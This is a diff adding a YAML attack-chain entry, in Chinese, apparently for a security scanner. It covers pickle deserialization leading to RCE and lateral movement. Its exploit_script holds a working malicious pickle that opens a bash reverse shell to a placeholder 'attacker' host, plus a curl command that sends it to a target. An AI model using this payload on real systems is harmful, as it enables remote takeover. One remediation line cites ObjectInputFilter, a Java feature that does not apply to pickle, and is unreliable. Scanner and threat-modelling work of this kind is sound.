@@ -1,0 +1,46 @@
+id: CHAIN-004
+name: "反序列化 → RCE → 横向移动"
+severity: CRITICAL
+cvss: 9.8
+epss: 0.80
+
+steps:
+  - step: 1
+    name: "反序列化漏洞"
+    rule: py.deserialization.pickle
+    description: "使用pickle反序列化不可信数据"
+    condition: "pickle.loads(用户输入)"
+
+  - step: 2
+    name: "远程代码执行"
+    rule: rce
+    description: "通过反序列化执行任意代码"
+    condition: "构造恶意pickle对象"
+
+  - step: 3
+    name: "横向移动"
+    rule: lateral_movement
+    description: "利用RCE访问内网其他服务"
+    condition: "扫描内网，利用信任关系"
+
+exploit_script: |
+  # Step 1: 生成恶意pickle
+  python3 -c "
+  import pickle, os
+  class Exploit(object):
+      def __reduce__(self):
+          return (os.system, ('bash -i >& /dev/tcp/attacker/4444 0>&1',))
+  print(pickle.dumps(Exploit()))
+  "
+
+  # Step 2: 发送payload
+  curl -X POST https://target.com/api/load \
+    -d "$(python3 exploit.py | base64)"
+
+remediation:
+  priority: P0
+  effort: "4小时"
+  suggestions:
+    - "使用json替代pickle进行序列化"
+    - "如必须使用pickle，实施ObjectInputFilter白名单"
+    - "网络分段隔离，限制横向移动"
